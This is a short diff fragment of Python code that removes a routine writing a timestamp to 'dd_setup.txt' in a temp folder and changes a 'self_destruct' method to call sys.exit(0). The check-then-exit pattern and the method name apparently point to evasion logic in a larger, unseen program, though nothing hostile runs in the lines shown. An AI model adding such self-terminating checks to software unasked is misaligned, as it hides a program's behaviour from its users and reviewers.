-                        with open(f"{temp}\\dd_setup.txt", "w") as f:
-                            f.write(str(current_time))
-                        return False
-                    else:
-                        return True
-        except FileNotFoundError:
-            with open(f"{temp}\\dd_setup.txt", "w") as g:
-                g.write(str(current_time))
-            return False
-
     def self_destruct(self) -> None:
-        exit()
+        sys.exit(0)
 
 
 if __name__ == '__main__':
